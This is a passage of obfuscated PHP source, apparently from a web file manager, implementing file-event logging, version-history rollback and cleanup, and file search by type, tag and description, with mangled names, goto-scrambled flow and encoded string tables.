$A¹”›—’ÊË->sourceInfo($C¾Ëº¹ÚÕ); goto A™¹ÁÚ¿©–; a†Úå¹ğ†Ø: } public function eventCopy($e­›”±å­“) { $this->eventCreate($e­›”±å­“, $_SERVER[ì‹É][482]); } public function eventRename($bÓ¼è„¡Œ×, $bíÆ‹Å­àØ, $d‹«ğº›Ÿ£) { $DèŒÓ‰ŒÑŠ =& $_SERVER[ì‹É]; $AáôÒ„Àîì = array($DèŒÓ‰ŒÑŠ[979] => $bíÆ‹Å­àØ, $DèŒÓ‰ŒÑŠ[980] => $d‹«ğº›Ÿ£); return $this->addEvent($bÓ¼è„¡Œ×, $DèŒÓ‰ŒÑŠ[1095], $AáôÒ„Àîì); } public function eventAddComment($Dà‚å¢·§›, $a’ÅÄ…) { return $this->addEvent($Dà‚å¢·§›, $_SERVER[ì‹É][2193], $a’ÅÄ…); } public function eventAddDesc($DÔï¶ˆô‘, $EéĞ£ë•) { return $this->addEvent($DÔï¶ˆô‘, $_SERVER[ì‹É][2194], $EéĞ£ë•); } public function listBySource($aáÂ¾’”öâ) { goto Eë·„Ã¾Í»; Eë·„Ã¾Í»: $AŒ´Œ«›œ =& $_SERVER[ì‹É]; $Bó’®Ò = Model($AŒ´Œ«›œ[1083])->sourceInfo($aáÂ¾’”öâ); $DÙíñŒàç„ = array($AŒ´Œ«›œ[380] => $aáÂ¾’”öâ); goto aá¬Å»µ”; FËË‘¯ŸõÙ: $aùÄøàÜç¿ = $this->eventListParse($aùÄøàÜç¿, $aáÂ¾’”öâ); show_json($aùÄøàÜç¿); goto d¿¹Éø­×¤; aá¬Å»µ”: if ($Bó’®Ò[$AŒ´Œ«›œ[367]] == $AŒ´Œ«›œ[84]) { $dÏïø–İ¬… = Model($AŒ´Œ«›œ[1083])->listSearchChildren($aáÂ¾’”öâ, 20000); $dÏïø–İ¬…[] = $aáÂ¾’”öâ . $AŒ´Œ«›œ[358]; $DÙíñŒàç„ = array($AŒ´Œ«›œ[366] => array($AŒ´Œ«›œ[7], $dÏïø–İ¬…)); } $aùÄøàÜç¿ = $this->where($DÙíñŒàç„)->order($AŒ´Œ«›œ[2195])->selectPage(); if ($aùÄøàÜç¿[$AŒ´Œ«›œ[347]][$AŒ´Œ«›œ[348]] == 0) { $aùÄøàÜç¿[$AŒ´Œ«›œ[347]][$AŒ´Œ«›œ[348]] = 1; $aùÄøàÜç¿[$AŒ´Œ«›œ[350]] = array(array($AŒ´Œ«›œ[380] => $aáÂ¾’”öâ, $AŒ´Œ«›œ[2178] => $Bó’®Ò[$AŒ´Œ«›œ[457]], $AŒ´Œ«›œ[1342] => $Bó’®Ò[$AŒ´Œ«›œ[375]], $AŒ´Œ«›œ[385] => $AŒ´Œ«›œ[2196], $AŒ´Œ«›œ[386] => $Bó’®Ò[$AŒ´Œ«›œ[184]], $AŒ´Œ«›œ[1344] => $AŒ´Œ«›œ[33])); } goto FËË‘¯ŸõÙ; d¿¹Éø­×¤: } private function eventListParse($eÎôÜç§, $f¥ô†Û«ÔÏ) { goto FÚ´ßĞİŸÛ; CµÏª‚–¸Ğ: $FŒõßÙ›‹ = Model($déÂã×Ú®[757])->sourceListInfo($F¡‹§ˆ»Î, !0); foreach ($dÙ‘ïÍ²åĞ as &$aŠİ‰¶±È‘) { if ($aŠİ‰¶±È‘[$déÂã×Ú®[29]] == $déÂã×Ú®[484] && isset($aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[979]])) { $aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[979]] = $FŒõßÙ›‹[$aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[979]]]; $aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[980]] = $FŒõßÙ›‹[$aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[980]]]; } if ($aŠİ‰¶±È‘[$déÂã×Ú®[29]] == $déÂã×Ú®[2192] && isset($aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[366]])) { $aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[366]] = $FŒõßÙ›‹[$aŠİ‰¶±È‘[$déÂã×Ú®[401]][$déÂã×Ú®[366]]]; } $aŠİ‰¶±È‘[$déÂã×Ú®[388]] = $FŒõßÙ›‹[$aŠİ‰¶±È‘[$déÂã×Ú®[366]]]; $aŠİ‰¶±È‘[$déÂã×Ú®[2197]] = $FŒõßÙ›‹[$aŠİ‰¶±È‘[$déÂã×Ú®[2184]]]; if ($aŠİ‰¶±È‘[$déÂã×Ú®[29]] == $déÂã×Ú®[1982]) { $aŠİ‰¶±È‘[$déÂã×Ú®[2197]] = $aŠİ‰¶±È‘[$déÂã×Ú®[388]]; $aŠİ‰¶±È‘[$déÂã×Ú®[2184]] = $aŠİ‰¶±È‘[$déÂã×Ú®[2197]][$déÂã×Ú®[366]]; $aŠİ‰¶±È‘[$déÂã×Ú®[388]] = !1; $aŠİ‰¶±È‘[$déÂã×Ú®[366]] = $déÂã×Ú®[33]; } $aŠİ‰¶±È‘[$déÂã×Ú®[2149]] = $AÙëË˜ô¡Ô[$aŠİ‰¶±È‘[$déÂã×Ú®[1351]]]; } $eÎôÜç§[$déÂã×Ú®[350]] = $dÙ‘ïÍ²åĞ; goto a£ÌçŸò÷; a£ÌçŸò÷: return $eÎôÜç§; goto cåÒªÏ”; aÅ•ï»õ†Ü: $a±¼§óÔ±Á = array_to_keyvalue($dÙ‘ïÍ²åĞ, $déÂã×Ú®[33], $déÂã×Ú®[2184]); foreach ($dÙ‘ïÍ²åĞ as $aŠİ‰¶±È‘) { $A˜ãßÏÒĞÌ = $aŠİ‰¶±È‘[$déÂã×Ú®[401]]; if ($aŠİ‰¶±È‘[$déÂã×Ú®[29]] == $déÂã×Ú®[484] && isset($A˜ãßÏÒĞÌ[$déÂã×Ú®[979]])) { $F¡‹§ˆ»Î[] = $A˜ãßÏÒĞÌ[$déÂã×Ú®[979]] . $déÂã×Ú®[33]; $F¡‹§ˆ»Î[] = $A˜ãßÏÒĞÌ[$déÂã×Ú®[980]] . $déÂã×Ú®[33]; } if ($aŠİ‰¶±È‘[$déÂã×Ú®[29]] == $déÂã×Ú®[2192] && isset($A˜ãßÏÒĞÌ[$déÂã×Ú®[366]])) { $F¡‹§ˆ»Î[] = $A˜ãßÏÒĞÌ[$déÂã×Ú®[366]] . $déÂã×Ú®[33]; } } $F¡‹§ˆ»Î = array_merge($F¡‹§ˆ»Î, $a±¼§óÔ±Á, array($f¥ô†Û«ÔÏ . $déÂã×Ú®[33])); goto Dæ‚‘­ãØè; FÚ´ßĞİŸÛ: $déÂã×Ú® =& $_SERVER[ì‹É]; $dÙ‘ïÍ²åĞ = $eÎôÜç§[$déÂã×Ú®[350]]; $F¡‹§ˆ»Î = array_to_keyvalue($dÙ‘ïÍ²åĞ, $déÂã×Ú®[33], $déÂã×Ú®[366]); goto aÅ•ï»õ†Ü; Dæ‚‘­ãØè: $F¡‹§ˆ»Î = array_unique($F¡‹§ˆ»Î); $d«¢ÅğùëŠ = array_unique(array_to_keyvalue($dÙ‘ïÍ²åĞ, $déÂã×Ú®[33], $déÂã×Ú®[1351])); $AÙëË˜ô¡Ô = Model($déÂã×Ú®[469])->userListInfo($d«¢ÅğùëŠ); goto CµÏª‚–¸Ğ; cåÒªÏ”: } public function removeBySource($c™Ïç•§ñ½) { $a‚õŸØŒŠ¢ = array($_SERVER[ì‹É][380] => $c™Ïç•§ñ½); $this->where($a‚õŸØŒŠ¢)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\151\x6f\x5f\x73\x6f\165\162\143\145\x5f\150\151\x73\164\157\162\x79"; public function addHistory($A·Å¨¯šÔ, $AˆÒõà²²ª = '') { $bª°œ­‹öì =& $_SERVER[ì‹É]; $cŞ£êîöÖ = array($bª°œ­‹öì[380] => $A·Å¨¯šÔ[$bª°œ­‹öì[366]], $bª°œ­‹öì[1342] => isset($A·Å¨¯šÔ[$bª°œ­‹öì[376]]) ? $A·Å¨¯šÔ[$bª°œ­‹öì[376]] : $A·Å¨¯šÔ[$bª°œ­‹öì[375]], $bª°œ­‹öì[416] => $A·Å¨¯šÔ[$bª°œ­‹öì[415]], $bª°œ­‹öì[512] => $A·Å¨¯šÔ[$bª°œ­‹öì[78]], $bª°œ­‹öì[2198] => $AˆÒõà²²ª); $c¤çÍªË‡¬ = $GLOBALS[$bª°œ­‹öì[6]][$bª°œ­‹öì[85]][$bª°œ­‹öì[2199]]; if ($c¤çÍªË‡¬ > 1) { $this->historyAutoClear($cŞ£êîöÖ[$bª°œ­‹öì[366]]); $this->add($cŞ£êîöÖ); } Model($bª°œ­‹öì[2200])->eventFileEdit($A·Å¨¯šÔ[$bª°œ­‹öì[366]]); } private function historyAutoClear($eïœ§ÄÏã) { goto DÀ³í®Ì¢; FÆ«¶ƒ”Èâ: $b—ĞÀÀË‚ï = array($cÃÆ‚±¯‹ª[382] => array($cÃÆ‚±¯‹ª[7], $c²ê½”Ô)); $this->where($b—ĞÀÀË‚ï)->delete(); Model($cÃÆ‚±¯‹ª[418])->remove($D–ÜÖšÎù); goto e¨Æ™³íƒ÷; D‘µ·Ñ²¯£: if ($D ç–ŞğĞ >= 500) { return; } $b—ĞÀÀË‚ï = array($cÃÆ‚±¯‹ª[380] => $eïœ§ÄÏã); $D®–‹ƒàƒ = $this->field($cÃÆ‚±¯‹ª[2203])->where($b—ĞÀÀË‚ï)->order($cÃÆ‚±¯‹ª[2195])->select(); goto FÊ—î¦‡¶â; A‘Î¬ïã”©: $D–ÜÖšÎù = array_to_keyvalue($D®–‹ƒàƒ, $cÃÆ‚±¯‹ª[33], $cÃÆ‚±¯‹ª[415]); $D–ÜÖšÎù = array_slice($D–ÜÖšÎù, $D ç–ŞğĞ); if (!$c²ê½”Ô || !$D–ÜÖšÎù) { return; } goto FÆ«¶ƒ”Èâ; DÀ³í®Ì¢: $cÃÆ‚±¯‹ª =& $_SERVER[ì‹É]; $bÁÛààºò = Model($cÃÆ‚±¯‹ª[1061])->get($cÃÆ‚±¯‹ª[2201]); $BºĞ£ÇˆÉñ = $GLOBALS[$cÃÆ‚±¯‹ª[6]][$cÃÆ‚±¯‹ª[85]][$cÃÆ‚±¯‹ª[2199]]; goto c¶ñÃçÃ—‚; c¶ñÃçÃ—‚: $AåãŒÈË = $bÁÛààºò == $cÃÆ‚±¯‹ª[2202] ? 3 : $BºĞ£ÇˆÉñ; if ($BºĞ£ÇˆÉñ <= 1) { $AåãŒÈË = 1; } $D ç–ŞğĞ = $AåãŒÈË - 1; goto D‘µ·Ñ²¯£; FÊ—î¦‡¶â: if (!$D®–‹ƒàƒ || $D ç–ŞğĞ >= count($D®–‹ƒàƒ)) { return; } $c²ê½”Ô = array_to_keyvalue($D®–‹ƒàƒ, $cÃÆ‚±¯‹ª[33], $cÃÆ‚±¯‹ª[364]); $c²ê½”Ô = array_slice($c²ê½”Ô, $D ç–ŞğĞ); goto A‘Î¬ïã”©; e¨Æ™³íƒ÷: } public function listData($a¬¤Ê¹ö¿) { goto A°·±áà¿¢; A°·±áà¿¢: $dö¶…èÌ =& $_SERVER[ì‹É]; $B—•›ò§Æ = array($dö¶…èÌ[380] => $a¬¤Ê¹ö¿); $Aµˆ—¾Ú¾Œ = $dö¶…èÌ[2204]; goto c³ĞùØÀ™˜; eã•ÈÂØ¬µ: $Dƒê¼ò“Áˆ = 3; if ($bÔ¥«Ú…é == $dö¶…èÌ[2202]) { $c×È®ø„[$dö¶…èÌ[350]] = array_slice($c×È®ø„[$dö¶…èÌ[350]], 0, $Dƒê¼ò“Áˆ); $c×È®ø„[$dö¶…èÌ[347]] = array($dö¶…èÌ[2205] => 1, $dö¶…èÌ[2206] => 20, $dö¶…èÌ[2207] => 1, $dö¶…èÌ[2208] => count($c×È®ø„[$dö¶…èÌ[350]])); } return $c×È®ø„; goto BËŠÉïÓªù; c³ĞùØÀ™˜: $c×È®ø„ = $this->field($Aµˆ—¾Ú¾Œ)->where($B—•›ò§Æ)->order($dö¶…èÌ[2195])->selectPage(); $this->_listAppendUser($c×È®ø„[$dö¶…èÌ[350]]); $bÔ¥«Ú…é = Model($dö¶…èÌ[1061])->get($dö¶…èÌ[2201]); goto eã•ÈÂØ¬µ; BËŠÉïÓªù: } protected function _listAppendUser(&$b“¯«¼ŒºÀ) { $f‹¸È¸ßËØ =& $_SERVER[ì‹É]; $DĞ§÷Ÿö˜ = array_to_keyvalue($b“¯«¼ŒºÀ, $f‹¸È¸ßËØ[33], $f‹¸È¸ßËØ[1351]); $EË»ƒÖ¾ = Model($f‹¸È¸ßËØ[469])->userListInfo($DĞ§÷Ÿö˜); foreach ($b“¯«¼ŒºÀ as &$e§²¾Ûçá„) { $a¾…ªêä± = $e§²¾Ûçá„[$f‹¸È¸ßËØ[1351]]; $e§²¾Ûçá„[$f‹¸È¸ßËØ[375]] = $EË»ƒÖ¾[$a¾…ªêä±] ? $EË»ƒÖ¾[$a¾…ªêä±] : !1; } } public function fileInfo($b¯˜Ú½‰—) { $có‰Ğ±ãá¢ =& $_SERVER[ì‹É]; $dÍòèŞí´ = $this->tablePrefix; $fš°ˆ¿‡†Õ = "{$dÍòèŞí´}\x69\x6f\x5f\146\151\x6c\x65\x20\x66\x69\x6c\145\163\40\157\156\x20\x66\151\x6c\145\x73\56\146\x69\154\145\111\104\x20\75\x20\x68\151\x73\164\x6f\x72\171\56\x66\x69\x6c\x65\x49\x44"; return $this->alias($có‰Ğ±ãá¢[2209])->where(array($có‰Ğ±ãá¢[382] => $b¯˜Ú½‰—))->join($fš°ˆ¿‡†Õ, $có‰Ğ±ãá¢[2210])->find(); } public function removeItem($A‹£’ÆÙ¼ª) { $C–ñ·ƒ‚å =& $_SERVER[ì‹É]; $E•ˆîÙØ‹ = array($C–ñ·ƒ‚å[382] => $A‹£’ÆÙ¼ª); $cÚª•Ñô§ = $this->where($E•ˆîÙØ‹)->find(); if ($cÚª•Ñô§) { $A«±‡¨’™Í = $this->where($E•ˆîÙØ‹)->delete(); Model($C–ñ·ƒ‚å[418])->remove($cÚª•Ñô§[$C–ñ·ƒ‚å[415]]); return $A«±‡¨’™Í; } return !1; } public function removeBySource($Aëëµ–ê¥”) { goto C»‡Ã÷í·–; AÎå‡‚‰Í‰: $fŸ…ÏõÒ“ë = array($E‡äÉßÇÜ[380] => array($E‡äÉßÇÜ[7], $Aëëµ–ê¥”)); $b˜ÔèöïŒÔ = $this->field($E‡äÉßÇÜ[416])->where($fŸ…ÏõÒ“ë)->select(); if ($b˜ÔèöïŒÔ) { $this->where($fŸ…ÏõÒ“ë)->delete(); $AåùâÂ¬í = array_to_keyvalue($b˜ÔèöïŒÔ, $E‡äÉßÇÜ[33], $E‡äÉßÇÜ[415]); Model($E‡äÉßÇÜ[418])->remove($AåùâÂ¬í); } goto dÇ©” ô¶™; dÇ©” ô¶™: return !0; goto Cƒ¬µ©¶Ş; C»‡Ã÷í·–: $E‡äÉßÇÜ =& $_SERVER[ì‹É]; if (!$Aëëµ–ê¥”) { return !1; } if (!is_array($Aëëµ–ê¥”)) { $Aëëµ–ê¥” = array($Aëëµ–ê¥”); } goto AÎå‡‚‰Í‰; Cƒ¬µ©¶Ş: } public function setDetail($bøãÏÎ‡ÅÀ, $e»ÎŞ­Œ©Ÿ) { $fôÛ¿ƒÃñ– =& $_SERVER[ì‹É]; return $this->where(array($fôÛ¿ƒÃñ–[382] => $bøãÏÎ‡ÅÀ))->save(array($fôÛ¿ƒÃñ–[2198] => $e»ÎŞ­Œ©Ÿ)); } public function rollbackToItem($D Ò”±õ†¥, $dÙÜÎ°Íàé) { goto b¬áÀñ‰ãõ; Cë¥«±³¨: $EÂàÊÏá = $this->find($dÙÜÎ°Íàé); $fÏ”Ã˜ø…Ú = array($FÛ²óÏáâÁ[415] => $EÂàÊÏá[$FÛ²óÏáâÁ[415]], $FÛ²óÏáâÁ[78] => $EÂàÊÏá[$FÛ²óÏáâÁ[78]], $FÛ²óÏáâÁ[108] => time(), $FÛ²óÏáâÁ[376] => USER_ID); Model($FÛ²óÏáâÁ[757])->where(array($FÛ²óÏáâÁ[366] => $D Ò”±õ†¥))->save($fÏ”Ã˜ø…Ú); goto c¾Õ›¶¢; c¾Õ›¶¢: return $this->where(array($FÛ²óÏáâÁ[382] => $dÙÜÎ°Íàé))->delete(); goto aô‰¸Ï‡£; b¬áÀñ‰ãõ: $FÛ²óÏáâÁ =& $_SERVER[ì‹É]; $fåØ“›ä•¯ = Model($FÛ²óÏáâÁ[757])->sourceInfo($D Ò”±õ†¥); $this->addHistory($fåØ“›ä•¯); goto Cë¥«±³¨; aô‰¸Ï‡£: } public function clearSame($EÒÏÔï›„¡) { goto aÂß‹ë×¥; EÄè¶ÀÅ¶¨: $c§÷Ì¶ˆ‚§ = array(); $BÂÒí«À¶Ú = array(); foreach ($C±àš§Øó‘ as $BñŠ‡ì›÷Ç) { if (count($BñŠ‡ì›÷Ç) <= 1) { continue; } foreach ($BñŠ‡ì›÷Ç as $Cùœ½‰µÈò) { $c§÷Ì¶ˆ‚§[] = $Cùœ½‰µÈò[$AçÊ»½°İî[415]]; $BÂÒí«À¶Ú[] = $Cùœ½‰µÈò[$AçÊ»½°İî[364]]; } } goto c‰Ô«ÄòÚĞ; c‰Ô«ÄòÚĞ: if (!$BÂÒí«À¶Ú) { return; } $this->where(array($AçÊ»½°İî[364] => array($AçÊ»½°İî[7], $BÂÒí«À¶Ú)))->delete(); Model($AçÊ»½°İî[418])->remove($c§÷Ì¶ˆ‚§); goto CÇÒá‚ˆ³‘; aÂß‹ë×¥: $AçÊ»½°İî =& $_SERVER[ì‹É]; $d·©·¼»ï = $this->listData($EÒÏÔï›„¡); $C±àš§Øó‘ = array_to_keyvalue_group($d·©·¼»ï, $AçÊ»½°İî[415]); goto EÄè¶ÀÅ¶¨; CÇÒá‚ˆ³‘: } public function userSpace() { $cÎ²‘ãœ‰î =& $_SERVER[ì‹É]; $b¾Éç‚‡í = $this->tablePrefix; $e¬ó†¶¹ª‚ = array($cÎ²‘ãœ‰î[1342] => USER_ID); $Aá…¿¯ìàò = "{$b¾Éç‚‡í}\151\157\137\x66\x69\x6c\x65\x20\x66\x69\154\x65\x73\x20\x6f\x6e\x20\x66\x69\x6c\145\x73\x2e\x66\151\x6c\145\111\x44\x20\75\40\150\x69\x73\x74\157\x72\171\x2e\146\151\x6c\145\x49\x44"; return $this->alias($cÎ²‘ãœ‰î[2209])->where($e¬ó†¶¹ª‚)->join($Aá…¿¯ìàò, $cÎ²‘ãœ‰î[2210])->sum($cÎ²‘ãœ‰î[78]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($B†­ÈÇĞ) { goto fİí«“ªæ; fİí«“ªæ: $a¹äù¯‰‘ =& $_SERVER[ì‹É]; $DÕ÷ŞÔ¡‡Í = KodIO::fileTypeList(); $BÄ‡¬áÖÔà = $DÕ÷ŞÔ¡‡Í[$B†­ÈÇĞ]; goto BÈÛãÇ¨§; BŸŠ­¼: if (!$BÄ‡¬áÖÔà[$a¹äù¯‰‘[157]]) { $A†ğô…ÇÄ = array_to_keyvalue($DÕ÷ŞÔ¡‡Í, $a¹äù¯‰‘[33], $a¹äù¯‰‘[157]); $cóÇÑì‰¶Û = implode($a¹äù¯‰‘[47], $A†ğô…ÇÄ); $C™†î‹…Œ‘ = $a¹äù¯‰‘[2167]; } $B¸˜©‘Ê· = explode($a¹äù¯‰‘[47], trim($cóÇÑì‰¶Û, $a¹äù¯‰‘[47])); return array($C™†î‹…Œ‘, $B¸˜©‘Ê·); goto B¥”µÆ‰Õœ; BÈÛãÇ¨§: if (!$BÄ‡¬áÖÔà) { return array(); } $cóÇÑì‰¶Û = $BÄ‡¬áÖÔà[$a¹äù¯‰‘[157]]; $C™†î‹…Œ‘ = $a¹äù¯‰‘[7]; goto BŸŠ­¼; B¥”µÆ‰Õœ: } public function listPathType($c¡Ì˜œßª©) { $e°¡ö°¦ƒğ =& $_SERVER[ì‹É]; $FßéªÌ ‰‡ = $this->fileTypeWhere($c¡Ì˜œßª©); if (!$FßéªÌ ‰‡) { return array(); } $Bö»°‘«¸ = array($e°¡ö°¦ƒğ[513] => SourceModel::TYPE_USER, $e°¡ö°¦ƒğ[514] => USER_ID, $e°¡ö°¦ƒğ[510] => 0, $e°¡ö°¦ƒğ[511] => $FßéªÌ ‰‡); return $this->listSource($Bö»°‘«¸); } public function listSearch($a“ƒ¨»áÙÚ, $a–’¶ê†Ó = 300) { goto dÃÍéÏÃ¥š; aƒÆ…ì´çß: $this->_listMake($AÛ¶÷ÔÕª); return $AÛ¶÷ÔÕª; goto e«Ëà¦ê”; FÍÛ•……Á: $this->_listSearchDesc($AÛ¶÷ÔÕª, $a“ƒ¨»áÙÚ, $c›Ê™ê); $this->_listSearchTag($AÛ¶÷ÔÕª, $a“ƒ¨»áÙÚ, $c›Ê™ê); $this->_listDataApply($AÛ¶÷ÔÕª[$A™İ×ÇèÜÏ[350]]); goto aƒÆ…ì´çß; dÃÍéÏÃ¥š: $A™İ×ÇèÜÏ =& $_SERVER[ì‹É]; if (isset($a“ƒ¨»áÙÚ[$A™İ×ÇèÜÏ[2092]]) && $a“ƒ¨»áÙÚ[$A™İ×ÇèÜÏ[2092]]) { $a“ƒ¨»áÙÚ[$A™İ×ÇèÜÏ[2092]] = str_replace($A™İ×ÇèÜÏ[1502], $A™İ×ÇèÜÏ[2211], trim($a“ƒ¨»áÙÚ[$A™İ×ÇèÜÏ[2092]])); } $b‚Ñ‰õ¿Å¹ = $this->_parseSearchWhere($a“ƒ¨»áÙÚ); goto c»Ä÷§©ë­; båÒš—ºŠ: $this->_listSearchBindPinyin($a“ƒ¨»áÙÚ, $b‚Ñ‰õ¿Å¹, $C®ƒ°¿é‹); $this->alias($A™İ×ÇèÜÏ[479])->_makeOrder()->cache(null, 10); $AÛ¶÷ÔÕª = $this->distinct(!0)->field($C®ƒ°¿é‹)->where($b‚Ñ‰õ¿Å¹)->selectPage($a–’¶ê†Ó); goto FÍÛ•……Á; c»Ä÷§©ë­: if (!isset($b‚Ñ‰õ¿Å¹[$A™İ×ÇèÜÏ[393]])) { $b‚Ñ‰õ¿Å¹[$A™İ×ÇèÜÏ[393]] = 0; } $C®ƒ°¿é‹ = $A™İ×ÇèÜÏ[2212]; $c›Ê™ê = $C®ƒ°¿é‹; goto båÒš—ºŠ; e«Ëà¦ê”: } private function _listSearchTag(&$bê›¸ğ‘ ¢, $e‡ñ¾‹š, $f©‚ÈĞôØê) { goto B‘ê­é›ó¿; eøˆÈÑç„‰: $e•¾ôäÙö‡ = array_to_keyvalue($e•¾ôäÙö‡, $AØÒ•Æ¯¤[33], $AØÒ•Æ¯¤[76]); $cõ„ÈºÈÂ = array_unique($e•¾ôäÙö‡); $this->_listSearchMerge($bê›¸ğ‘ ¢, $e‡ñ¾‹š, $f©‚ÈĞôØê, $cõ„ÈºÈÂ); goto bÄÀ¦«–¤; B‘ê­é›ó¿: $AØÒ•Æ¯¤ =& $_SERVER[ì‹É]; if (!$e‡ñ¾‹š[$AØÒ•Æ¯¤[2092]] || $bê›¸ğ‘ ¢[$AØÒ•Æ¯¤[347]][$AØÒ•Æ¯¤[336]] > 1) { return; } $a­×òè˜ = Model($AØÒ•Æ¯¤[2213])->listData(); goto bññŒ­İŒ; bññŒ­İŒ: $eñá„†ö‰ = array(); $DÕÑ²¼ˆ…Ë = $e‡ñ¾‹š[$AØÒ•Æ¯¤[2092]]; foreach ($a­×òè˜ as $EôÑ­Ğ…®˜) { $aÉ„‹Ü‘­… = $EôÑ­Ğ…®˜[$AØÒ•Æ¯¤[28]]; $aƒÎÖ”Íé = str_replace($AØÒ•Æ¯¤[50], $AØÒ•Æ¯¤[33], Pinyin::encode($aÉ„‹Ü‘­…)); if (stripos($aÉ„‹Ü‘­…, $DÕÑ²¼ˆ…Ë) !== !1 || stripos($aƒÎÖ”Íé, $DÕÑ²¼ˆ…Ë) !== !1) { $eñá„†ö‰[] = $EôÑ­Ğ…®˜[$AØÒ•Æ¯¤[364]]; } } goto FÒßñÕÚ¯¿; FÒßñÕÚ¯¿: if (!$eñá„†ö‰) { return; } $f¶»ªÈ«Ş = array($AØÒ•Æ¯¤[390] => array($AØÒ•Æ¯¤[7], $eñá„†ö‰)); $e•¾ôäÙö‡ = Model($AØÒ•Æ¯¤[2214])->field($AØÒ•Æ¯¤[76])->where($f¶»ªÈ«Ş)->select(); goto eøˆÈÑç„‰; bÄÀ¦«–¤: } private function _listSearchDesc(&$b›ĞÔ›¯, $E£Š¦Òó¶Ï, $f¡Êî™èÙ) { goto aÛ«åÅóĞ…; aÛ«åÅóĞ…: $bğ‡î×ø¹’ =& $_SERVER[ì‹É]; if (!$E£Š¦Òó¶Ï[$bğ‡î×ø¹’[2092]] || $b›ĞÔ›¯[$bğ‡î×ø¹’[347]][$bğ‡î×ø¹’[336]] > 1) { return; } $eë­‡çÏˆ™ = $this->listSearchChildren($E£Š¦Òó¶Ï[$bğ‡î×ø¹’[457]]); goto döŒ…ÕâÉŠ; BØâƒè­ĞÅ: $F‹¬›ÁÙÅø = Model($bğ‡î×ø¹’[496])->field($bğ‡î×ø¹’[366])->where($cĞ° ‰±¢)->select(); $eù¶¢Â¯¾ƒ = array_to_keyvalue($F‹¬›ÁÙÅø, $bğ‡î×ø¹’[33], $bğ‡î×ø¹’[366]); $this->_listSearchMerge($b›ĞÔ›¯, $E£Š¦Òó¶Ï, $f¡Êî™èÙ, $eù¶¢Â¯¾ƒ); goto DÜÖØ·ƒ; döŒ…ÕâÉŠ: $eë­‡çÏˆ™ = array_unique($eë­‡çÏˆ™); if (!$eë­‡çÏˆ™) { return; } $cĞ° ‰±¢ = array($bğ‡î×ø¹’[366] => array($bğ‡î×ø¹’[7], $eë­‡çÏˆ™), $bğ‡î×ø¹’[90] => $bğ‡î×ø¹’[401], $bğ‡î×ø¹’[354] => array($bğ‡î×ø¹’[756], $bğ‡î×ø¹’[2094] . $E£Š¦Òó¶Ï[$bğ‡î×ø¹’[2092]] . $bğ‡î×ø¹’[2094])); goto BØâƒè­ĞÅ; DÜÖØ·ƒ: } private function _listSearchMerge(&$fÄ…Ğáô‹», $e‹„»ÖÒô, $A„„Ë“±…Ã, $A—À›¹ŠÑâ) { goto Fôìİ‚; CÍ˜Ş‡“•¶: $c“±†ÓÁ = $this->field($A„„Ë“±…Ã)->where($bÎ·†‘¬¹)->select(); if (!$c“±†ÓÁ) { return; } $bŸ¢ØÀ¦  = array(); goto Câ¯æ°Òî; Fôìİ‚: $FÉëˆğœèê =& $_SERVER[ì‹É]; if (!$A—À›¹ŠÑâ) { return; } $bìÇ°Ä„ì = array_to_keyvalue($fÄ…Ğáô‹»[$FÉëˆğœèê[350]], $FÉëˆğœèê[33], $FÉëˆğœèê[366]); goto DÅ¾à‹¾­¦; DÅ¾à‹¾­¦: $Fˆ¤§ê™Â¢ = array_diff($A—À›¹ŠÑâ, $bìÇ°Ä„ì); if (!$Fˆ¤§ê™Â¢) { return; } $bÎ·†‘¬¹ = array($FÉëˆğœèê[366] => array($FÉëˆğœèê[7], $Fˆ¤§ê™Â¢)); goto CÍ˜Ş‡“•¶; Câ¯æ°Òî: foreach ($c“±†ÓÁ as $eÍæºğ¶æ) { $f¶õŒ£‡ƒÎ = $FÉëˆğœèê[47] . $e‹„»ÖÒô[$FÉëˆğœèê[457]] . $FÉëˆğœèê[47]; if (stripos($eÍæºğ¶æ[$FÉëˆğœèê[455]], $f¶õŒ£‡ƒÎ) !== !1) { $bŸ¢ØÀ¦ [] = $eÍæºğ¶æ; } } $fÄ…Ğáô‹»[$FÉëˆğœèê[350]] = array_merge($bŸ¢ØÀ¦ , $fÄ…Ğáô‹»[$FÉëˆğœèê[350]]); $fÄ…Ğáô‹»[$FÉëˆğœèê[347]][$FÉëˆğœèê[348]] += count($bŸ¢ØÀ¦ ); goto fÖ³†”óŞÅ; fÖ³†”óŞÅ: } public function listSearchChildren($DİÂš»‹Í³, $aöÔ‰«“ïÛ = 5000) { goto Dâî»ŞâÊŒ; b÷á•¶§¿¯: $D±ÜãÆâ²¾ = $this->field($fÛÁÛß½ç[366])->where($bÚîÈÉÌ§)->select(); $bùÁ³µ“‹ë = array_to_keyvalue($D±ÜãÆâ²¾, $fÛÁÛß½ç[33], $fÛÁÛß½ç[366]); return $bùÁ³µ“‹ë; goto EËÓÈÊªÂÚ; fÏ†Ãéºâø: $bÚîÈÉÌ§ = array($fÛÁÛß½ç[455] => array($fÛÁÛß½ç[756], $F¤º·×Ë‰æ[$fÛÁÛß½ç[455]] . $F¤º·×Ë‰æ[$fÛÁÛß½ç[366]] . $fÛÁÛß½ç[476])); $A†ñÂº‚³ = $this->field($fÛÁÛß½ç[366])->cache(null, 600)->where($bÚîÈÉÌ§)->count(); if ($A†ñÂº‚³ > $aöÔ‰«“ïÛ) { return $this->_listSearchChildrenNear($DİÂš»‹Í³, $aöÔ‰«“ïÛ); } goto b÷á•¶§¿¯; Dâî»ŞâÊŒ: $fÛÁÛß½ç =& $_SERVER[ì‹É]; $bùÁ³µ“‹ë = array(); $F¤º·×Ë‰æ = $this->sourceInfo($DİÂš»‹Í³); goto fÏ†Ãéºâø; EËÓÈÊªÂÚ: } private function _listSearchChildrenNear($a²£òêèİ, $C“¿—Ê¸­á) { goto fŒ¦²§ŞŒÄ; fé³òÇÙ…Ò: $eÑÈÓ“¶Œ = $this->field($c‚º§µ¼—½[2215])->where($D…†öÃ©°¾)->select(); $e‚†´¬äÈ = array_to_keyvalue(array_filter_by_field($eÑÈÓ“¶Œ, $c‚º§µ¼—½[367], 